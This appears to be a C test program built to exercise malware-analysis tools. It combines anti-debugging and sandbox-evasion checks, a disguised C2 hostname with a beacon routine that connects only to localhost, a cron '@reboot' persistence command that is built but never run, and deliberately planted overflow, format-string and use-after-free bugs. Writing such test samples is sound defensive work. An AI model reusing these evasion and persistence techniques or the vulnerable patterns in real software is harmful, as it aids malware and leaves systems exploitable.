// Advanced C program with security-relevant features for analysis
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <dlfcn.h>
#include <errno.h>

#ifdef __linux__
#include <sys/ptrace.h>
#include <sys/stat.h>
#endif

// Configuration constants
#define C2_SERVER "msftupdater.com"
#define C2_PORT 443
#define MAX_BUFFER 1024
#define XOR_KEY_LEN 16

// Global variables (intentionally global for analysis)
unsigned char xor_key[XOR_KEY_LEN] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0
};

volatile int debug_detected = 0;
char *sensitive_data = NULL;

// Function pointer typedef for dynamic loading
typedef int (*crypto_func)(unsigned char*, size_t);

// Anti-debugging techniques
int detect_debugger() {
#ifdef __linux__
    // Method 1: ptrace detection
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1;
    }

    // Method 2: Check /proc/self/status
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "TracerPid:") && strstr(line, "0") == NULL) {
                fclose(fp);
                return 1;
            }
        }
        fclose(fp);
    }

    // Method 3: Timing check
    clock_t start = clock();
    volatile int sum = 0;
    for (int i = 0; i < 1000000; i++) {
        sum += i;
    }
    clock_t end = clock();
    double cpu_time = ((double)(end - start)) / CLOCKS_PER_SEC;
    if (cpu_time > 0.1) {
        return 1;
    }
#endif
    return 0;
}

// Signal handler for anti-debugging
void sigtrap_handler(int sig) {
    debug_detected = 1;
    exit(1);
}

// XOR encryption/decryption
void xor_crypt(unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xor_key[i % XOR_KEY_LEN];
    }
}

// Network beacon
int beacon_home() {
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[MAX_BUFFER];

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(C2_PORT);

    // Simulate connection (will fail)
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sockfd);
        return -1;
    }

    // Send beacon
    snprintf(buffer, sizeof(buffer), "GET /beacon HTTP/1.1\r\nHost: %s\r\n\r\n", C2_SERVER);
    send(sockfd, buffer, strlen(buffer), 0);

    close(sockfd);
    return 0;
}

// Process injection simulation
void* inject_code(void* arg) {
    // Simulate code injection pattern
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    if (handle) {
        // Look for system function
        void (*sys_func)(const char*) = dlsym(handle, "system");
        if (sys_func) {
            // Would execute command here
        }
        dlclose(handle);
    }
    return NULL;
}

// Vulnerable function (buffer overflow)
void vulnerable_strcpy(char *input) {
    char buffer[64];
    strcpy(buffer, input); // CWE-120: Buffer Copy without Checking Size
    printf("Buffer: %s\n", buffer);
}

// Format string vulnerability
void vulnerable_printf(char *input) {
    printf(input); // CWE-134: Uncontrolled Format String
}

// Use after free vulnerability
void use_after_free() {
    char *ptr = malloc(100);
    strcpy(ptr, "sensitive data");
    free(ptr);
    printf("Data: %s\n", ptr); // CWE-416: Use After Free
}

// Integer overflow
int vulnerable_alloc(int size) {
    if (size > 1000) {
        return -1;
    }
    char *buffer = malloc(size * sizeof(int)); // Potential integer overflow
    if (buffer) {
        free(buffer);
        return 0;
    }
    return -1;
}

// Persistence mechanism
void install_persistence() {
    char cmd[256];
    #ifdef __linux__
    // Cron persistence
    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", "/tmp/malware");
    // system(cmd); // Commented out for safety
    #endif
    printf("Persistence mechanism: %s\n", cmd);
}

// Thread function for resource consumption
void* cpu_burn(void* arg) {
    while (1) {
        // Infinite loop for CPU consumption
        volatile double result = 0;
        for (int i = 0; i < 1000000; i++) {
            result += (double)i * 3.14159;
        }
    }
    return NULL;
}

// Environment fingerprinting
void check_environment() {
    char *suspicious_env[] = {
        "SANDBOX",
        "VIRUS",
        "MALWARE",
        "ANALYSIS",
        NULL
    };

    for (int i = 0; suspicious_env[i]; i++) {
        if (getenv(suspicious_env[i])) {
            printf("Suspicious environment variable detected: %s\n", suspicious_env[i]);
            exit(1);
        }
    }

    // Check for common sandbox usernames
    char *user = getenv("USER");
    if (user && (strstr(user, "sandbox") || strstr(user, "virus"))) {
        printf("Sandbox username detected\n");
        exit(1);
    }
}

// Self-modifying code pattern
void self_modify() {
    unsigned char code[] = {0x90, 0x90, 0x90, 0xc3}; // NOP NOP NOP RET
    void (*func)() = (void(*)())code;
    // Would need to change memory permissions to execute
}

// Complex control flow
int complex_decision(int a, int b, int c, int d) {
    int result = 0;

    if (a > 0) {
        if (b > 0) {
            if (c > 0) {
                if (d > 0) {
                    result = a + b + c + d;
                } else {
                    result = a + b + c - d;
                }
            } else {
                if (d > 0) {
                    result = a + b - c + d;
                } else {
                    result = a + b - c - d;
                }
            }
        } else {
            // More nested conditions...
            result = a * 2;
        }
    } else {
        // Even more conditions...
        result = -1;
    }

    return result;
}

// Main function
int main(int argc, char *argv[]) {
    printf("Advanced C Test Binary\n");

    // Install signal handler
    signal(SIGTRAP, sigtrap_handler);

    // Anti-debugging checks
    if (detect_debugger()) {
        printf("Debugger detected!\n");
        return 1;
    }

    // Environment checks
    check_environment();

    // Allocate sensitive data
    sensitive_data = malloc(256);
    strcpy(sensitive_data, "Confidential Information");
    xor_crypt((unsigned char*)sensitive_data, strlen(sensitive_data));

    // Command line argument processing
    if (argc > 1) {
        if (strcmp(argv[1], "--inject") == 0) {
            pthread_t thread;
            pthread_create(&thread, NULL, inject_code, NULL);
            pthread_join(thread, NULL);
        } else if (strcmp(argv[1], "--persist") == 0) {
            install_persistence();
        } else if (strcmp(argv[1], "--overflow") == 0 && argc > 2) {
            vulnerable_strcpy(argv[2]);
        } else if (strcmp(argv[1], "--format") == 0 && argc > 2) {
            vulnerable_printf(argv[2]);
        } else if (strcmp(argv[1], "--uaf") == 0) {
            use_after_free();
        } else if (strcmp(argv[1], "--burn") == 0) {
            pthread_t threads[4];
            for (int i = 0; i < 4; i++) {
                pthread_create(&threads[i], NULL, cpu_burn, NULL);
            }
            sleep(5);
            for (int i = 0; i < 4; i++) {
                pthread_cancel(threads[i]);
            }
        }
    }

    // Network beacon attempt
    if (beacon_home() == 0) {
        printf("Beacon successful\n");
    } else {
        printf("Beacon failed\n");
    }

    // Complex calculation
    int result = complex_decision(10, -5, 3, 7);
    printf("Complex result: %d\n", result);

    // Decrypt and display sensitive data
    xor_crypt((unsigned char*)sensitive_data, strlen(sensitive_data));
    printf("Data: %s\n", sensitive_data);

    // Cleanup
    free(sensitive_data);

    return 0;
}
